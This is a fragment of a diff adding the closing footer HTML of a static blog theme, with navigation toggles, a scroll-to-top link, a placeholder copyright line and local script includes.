+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+      
+      <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/home/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com" target="_blank" rel="noopener">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+      
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- Google Analytics -->
+
+<!-- Disqus Comments -->
+
+
+    </div>
+</body>
+</html>
